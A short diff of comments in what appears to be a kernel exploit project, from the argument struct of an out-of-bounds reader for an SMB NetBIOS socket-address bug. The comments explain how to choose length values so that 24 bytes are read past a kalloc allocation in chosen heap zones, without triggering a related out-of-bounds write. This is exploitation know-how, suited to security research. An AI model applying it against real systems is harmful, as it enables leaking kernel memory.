@@ -23,7 +23,7 @@ struct xpl_oob_reader_base_args {
     //  Server netbios socket address length
     /// Providing a value greater than the element size of zone where `saddr` is allocated, will
     /// lead to out of bound read. For example if `saddr_ioc_len` is 32 and `saddr_snb_len` is
-    /// 56, the `saddr` will be allocated on `kext.kalloc.32` zone and subsequent copy of socket
+    /// 56, the `saddr` will be allocated on `default.kalloc.32` zone and subsequent copy of socket
     /// address will lead to 24 bytes out of bound read
     uint8_t saddr_snb_len;
     
@@ -33,10 +33,11 @@ struct xpl_oob_reader_base_args {
     /// 56 and`saddr_snb_name_seglen` is `(32 - offsetof(struct sockaddr_nb, snb_name)) + 24`
     /// will lead to 24 bytes out of bound read data being sent to SMB server
     /// NOTE: Before the `snb_name` is sent to SMB server, the socket address is duplicated
-    /// using `smb_dup_sockaddr` method, which will duplicate the `saddr` to `default.kalloc.64`
-    /// zone. So if you want an out of bound read from `default.kext.64` zone instead of other
+    /// using `smb_dup_sockaddr` method, which will duplicate the `saddr` to `default.64`
+    /// zone. So if you want an out of bound read from `default.64` zone instead of other
     /// zones in `KHEAP_KEXT`, the following values can be used: `saddr_ioc_len = 64`,
-    /// `saddr_snb_len = 64` and `saddr_snb_name_seglen = 64 +  (64 - offsetof(struct sockaddr_nb, snb_name))`
+    /// `saddr_snb_len = 64` and `saddr_snb_name_seglen = 64 +  (64 - offsetof(struct sockaddr_nb, snb_name))`.
+    /// This way the OOB write vulnerability will not be triggered.
     uint8_t saddr_snb_name_seglen;
     
     //  Local nebios socket address length
